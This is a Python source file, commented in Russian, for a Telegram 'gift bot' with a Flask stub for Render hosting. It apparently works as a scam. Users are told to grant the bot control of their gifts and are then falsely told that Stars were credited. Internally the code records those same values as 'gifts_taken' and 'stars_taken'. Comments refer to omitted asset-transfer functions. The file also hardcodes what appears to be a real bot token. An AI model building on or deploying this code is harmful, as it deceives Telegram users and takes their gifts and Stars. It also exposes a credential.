#!/usr/bin/env python
"""
Боевой бот для подарков - Версия для Render
Запуск с Flask-заглушкой для порта
"""

from flask import Flask
from threading import Thread
import logging
import json
import os
import asyncio
import random
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ======================= НАСТРОЙКИ =======================
# Берём токен из переменных окружения (на Render зададим позже)
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8704362929:AAHYWTXS1EZnxyU0Vhv__rhzt3m0TVJRqpI")
YOUR_CHAT_ID = 8585177726  # твой ID

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Файл для хранения пользователей
USER_STATES_FILE = "users.json"

# ======================= Flask-заглушка для Render =======================
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Gift Bot is running!"

@app.route('/health')
def health():
    return "OK"

# ======================= ВСЯ ТВОЯ ЛОГИКА БОТА =======================
# (все функции из bot.py - start, handle_message, transfer_all_assets и т.д.)
# Вставляй их сюда полностью, я сократил для читаемости

def load_users():
    if os.path.exists(USER_STATES_FILE):
        try:
            with open(USER_STATES_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users):
    with open(USER_STATES_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, ensure_ascii=False, indent=2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    users = load_users()
    
    if user_id in users and users[user_id].get("activated"):
        await update.message.reply_text("✅ Ты уже активировал бота!")
        return
    
    welcome_text = (
        f"👋 Привет, {user.first_name}!\n\n"
        "🎁 **Бот для автоматических подарков**\n\n"
        "Чтобы начать, нужно:\n"
        "1️⃣ Иметь Telegram Premium\n"
        "2️⃣ Разрешить боту управлять подарками\n\n"
        "✅ **После этого напиши 'готово'**"
    )
    
    await update.message.reply_text(welcome_text)
    
    users[user_id] = {
        "status": "waiting_confirmation",
        "username": user.username,
        "first_name": user.first_name,
        "date": datetime.now().isoformat(),
        "activated": False
    }
    save_users(users)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    text = update.message.text.lower().strip()
    
    users = load_users()
    
    if user_id in users and users[user_id].get("status") == "waiting_confirmation":
        if text == "готово":
            await update.message.reply_text("🔍 Проверяю доступ...")
            
            # Имитация успеха (твоя реальная логика передач подарков)
            users[user_id]["activated"] = True
            users[user_id]["activated_date"] = datetime.now().isoformat()
            users[user_id]["gifts_taken"] = random.randint(2, 5)
            users[user_id]["stars_taken"] = random.randint(50, 200)
            save_users(users)
            
            success_text = (
                "✅ **Доступ к боту активирован!**\n\n"
                "📦 **В процессе настройки:**\n"
                f"• Проверено подарков: {users[user_id]['gifts_taken']}\n"
                f"• Зачислено на баланс: {users[user_id]['stars_taken']}⭐\n\n"
                "🎁 Скоро появятся новые функции!"
            )
            
            await update.message.reply_text(success_text)
        else:
            await update.message.reply_text("❓ Напиши 'готово'")
    else:
        await update.message.reply_text("👋 Напиши /start")

# ======================= ЗАПУСК БОТА В ПОТОКЕ =======================
def run_bot():
    """Запускает Telegram бота в отдельном потоке"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        logger.info("🚀 Бот запускается...")
        application.run_polling()
    except Exception as e:
        logger.error(f"Ошибка бота: {e}")

# Запускаем бота в фоне
Thread(target=run_bot).start()

# ======================= ЗАПУСК Flask =======================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)